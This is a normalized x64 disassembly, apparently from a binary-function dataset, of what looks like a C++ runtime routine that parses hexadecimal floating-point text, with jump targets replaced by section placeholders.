cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
movzx ebx sil
mov [ r12 ] 0x2d
jmp r-xdata
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov rdx r14
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp esi 0x8
jge r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx r14
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rdx r14
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_140020200
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x8 ]
sub rsp 0x108
mov [ rbp - 0x60 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov r15 r9
mov [ rsp + 0x68 ] r9
mov rdi r8
mov [ rbp - 0x80 ] rdx
mov r12 rcx
mov rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x78 ]
mov [ rbp - 0x68 ] rax
lea rdx [ rbp - 0x78 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov r13 rax
mov [ rsp + 0x78 ] rax
xor ebx ebx
mov rsi [ rbp - 0x78 ]
test rsi rsi
je r-xdata
lea rdx [ rbp - 0x30 ]
mov rcx r13
call sub_14002b150
nop
mov [ rsp + 0x38 ] 0x30
mov [ rsp + 0x50 ] bx
mov [ rsp + 0x4c ] ebx
lea r14 [ r12 + 0x10 ]
mov [ rbp - 0x70 ] r14
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x50 ]
call sub_1400385a4
mov [ rsp + 0x38 ] 0x61
mov [ rsp + 0x54 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x54 ]
call sub_1400385a4
mov [ rsp + 0x38 ] 0x41
mov [ rsp + 0x58 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x58 ]
call sub_1400385a4
mov rsi [ rbp - 0x80 ]
mov r12 rsi
mov [ rsp + 0x38 ] 0x0
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x4c ]
call sub_14003825c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov [ r12 ] 0x7830
add r12 0x2
mov [ rsp + 0x70 ] r12
xor bl bl
mov [ rsp + 0x30 ] bl
xor eax eax
mov esi eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x60 ] eax
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov [ rsp + 0x30 ] 0x2b
mov [ rsp + 0x40 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_1400385a4
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
cmp [ rsi + 0x8 ] rbx
cmove rbx rsi
lea rcx [ rsp + 0x4c ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
lea rax [ rbp - 0x30 ]
mov rcx [ rbp - 0x30 ]
mov rdx [ rbp - 0x18 ]
cmp rdx 0x10
cmovae rax rcx
movzx r14d [ rsp + 0x54 ]
movzx r15d [ rsp + 0x58 ]
cmp [ rax ] 0x7f
je r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax [ rsp + 0x50 ]
jne r-xdata
mov [ rsp + 0x30 ] 0x2d
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_1400385a4
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
mov [ rsi ] 0x2b
jmp r-xdata
xor ebx ebx
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
lea rax [ rbp - 0x30 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] sil
jle r-xdata
mov rcx rdi
call sub_140021350
mov rdx r15
mov rcx rax
call sub_1400219d0
test al al
jne r-xdata
mov [ rsi ] 0x2d
lea r12 [ rsi + 0x1 ]
mov rcx rdi
call sub_140021350
test bl bl
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
cmp [ rbp - 0x20 ] rsi
jne r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov [ rsp + 0x40 ] 0x78
xor r15d r15d
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
test esi esi
jne r-xdata
movzx ecx [ rdi + 0xa ]
movzx eax [ rsp + 0x50 ]
cmp ax cx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
movzx r15d ax
xor ebx ebx
xor ebx ebx
movzx r15d bx
jmp r-xdata
mov rcx rdi
call sub_140021350
xor bl bl
jmp r-xdata
mov [ rsp + 0x40 ] 0x58
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
xor r13d r13d
cmp [ rdi + 0x8 ] al
jne r-xdata
mov [ r12 ] 0x30
inc r12
cmp r14w cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x9 ]
cmp ebx eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
lea rdx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
cmovae rdx [ rbp - 0x30 ]
cmp [ rsp + 0x38 ] 0x0
jne r-xdata
jmp r-xdata
mov r12d 0xf
mov [ rbp - 0x40 ] r12
mov r14d 0x1
mov [ rbp - 0x48 ] r14
mov [ rbp - 0x58 ] si
mov rsi rbx
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_1400219d0
mov r13 [ rbp - 0x58 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
movzx r13d [ rsp + 0x50 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
movzx ebx [ rdi + 0xa ]
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x8 ]
cmp bx ax
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp r15w cx
ja r-xdata
movzx edx r14w
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jle r-xdata
sub ebx edx
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r12 0x10
jb r-xdata
nop
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
movzx esi [ rsp + 0x30 ]
test sil sil
je r-xdata
nop
mov eax [ rsp + 0x60 ]
test eax eax
jns r-xdata
movzx r15d [ rsp + 0x50 ]
mov r14d [ rsp + 0x60 ]
mov esi 0xffff
nop
mov rbx [ rsp + 0x68 ]
call sub_14003b85c
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ r12 ] al
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
movzx ebx [ rsp + 0x30 ]
movzx edx r15w
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jg r-xdata
sub ebx edx
add ebx 0xa
test ebx ebx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
movzx r15d [ rsp + 0x58 ]
movzx r14d [ rsp + 0x54 ]
mov r13 [ rsp + 0x78 ]
mov r12 [ rsp + 0x70 ]
mov esi [ rsp + 0x4c ]
mov rcx r13
call j_sub_14003ad04
jmp r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
movzx ecx [ rdi + 0xa ]
movzx eax [ rsp + 0x50 ]
cmp ax cx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x38 ] 0x0
jne r-xdata
jmp r-xdata
movzx edx [ rdi + 0xa ]
cmp r13w dx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ r12 ] 0x30
inc r12
inc eax
mov [ rsp + 0x60 ] eax
cmp [ rdi + 0xa ] r15w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r13d r13d
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rbx [ rsp + 0x68 ]
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp esi 0x24
jl r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
dec rsi
je r-xdata
movzx eax [ rsp + 0x54 ]
cmp ax cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x9 ]
cmp ebx eax
jg r-xdata
mov [ rdi ] rbx
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov r12 [ rbp - 0x80 ]
test sil sil
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
cmp r14w dx
ja r-xdata
movzx r8d r13w
movzx ecx dx
lea eax [ r8 + 0x9 ]
cmp ecx eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x60 ] r14d
mov esi [ rsp + 0x4c ]
movzx r14d [ rsp + 0x54 ]
movzx r15d [ rsp + 0x58 ]
dec r14d
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r13
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax [ rsp + 0x50 ]
jne r-xdata
inc [ rsp + 0x60 ]
jmp r-xdata
test rsi rsi
jne r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rsi ]
jne r-xdata
movzx eax [ rsp + 0x58 ]
cmp ax cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jle r-xdata
sub ebx edx
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
xor eax eax
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x108
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ r12 ] 0x0
mov eax [ rsp + 0x60 ]
mov rcx [ rbp - 0x68 ]
mov [ rcx ] eax
cmp [ rbp - 0x18 ] 0x10
jb r-xdata
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp r15w dx
ja r-xdata
movzx r8d r14w
movzx ecx dx
lea eax [ r8 + 0x5 ]
cmp ecx eax
jle r-xdata
sub ecx r8d
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movsxd rax ebx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov [ r12 ] al
inc r12
inc esi
mov [ rsp + 0x4c ] esi
test esi esi
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
mov [ rsp + 0x38 ] 0x1
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x0
je r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jg r-xdata
sub ebx edx
add ebx 0xa
test ebx ebx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x70
xor r15d r15d
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov r14 [ rbp - 0x70 ]
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movzx r8d r15w
movzx ecx dx
lea eax [ r8 + 0x5 ]
cmp ecx eax
jg r-xdata
sub ecx r8d
add ecx 0xa
test ecx ecx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
test rsi rsi
je r-xdata
inc rdx
jmp r-xdata
test rsi rsi
je r-xdata
test r15w r15w
je r-xdata
mov [ rsp + 0x30 ] 0x1
cmp [ rsp + 0x4c ] 0x24
jl r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ r12 ] 0x70
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] r15b
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp esi 0x24
jge r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp si ax
je r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x0
jle r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax r15w
jne r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax [ rsp + 0x50 ]
jne r-xdata
inc [ rsp + 0x60 ]
jmp r-xdata
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] r15
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x50
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
mov r8d 0x1
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movsxd rax ecx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov [ r12 ] al
inc r12
inc esi
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
cmp si ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rsp + 0x38 ] 0x1
inc rsi
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r14
cmp rax 0x1
jbe r-xdata
movsxd rax ebx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov rcx [ rsp + 0x70 ]
mov [ rcx ] al
inc rcx
mov [ rsp + 0x70 ] rcx
inc [ rsp + 0x4c ]
cmp [ rsp + 0x4c ] 0x0
je r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x7f
je r-xdata
xor r14d r14d
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] r15d
jle r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] r15
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
lea rbx [ r14 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
mov rcx rdi
call sub_140021350
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rsi ]
mov r12 [ rbp - 0x40 ]
mov r14 [ rbp - 0x48 ]
mov r13 [ rbp - 0x58 ]
jmp r-xdata
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
nop [ rax ] eax
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x2b
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0x8 ] r15b
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] r15d
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx esi [ rsp + 0x30 ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r12 rbx
jae r-xdata
xor ebx ebx
jmp r-xdata
movzx esi [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
cmp [ rdi + 0xa ] r13w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ r12 ] 0x2b
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
xor bl bl
mov [ rsp + 0x30 ] bl
mov esi r15d
mov r15 [ rsp + 0x68 ]
mov rdx r15
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8 r14
mov rdx rbx
lea rcx [ rbp - 0x58 ]
call sub_1400061b0
jmp r-xdata
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x2d
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r14d r14d
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
movzx ebx sil
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x48 ] rbx
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] bl
mov r13 [ rbp - 0x58 ]
mov r14 [ rbp - 0x48 ]
mov r12 [ rbp - 0x40 ]
test rbx rbx
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
movzx ebx sil
mov [ r12 ] 0x2d
jmp r-xdata
xor eax eax
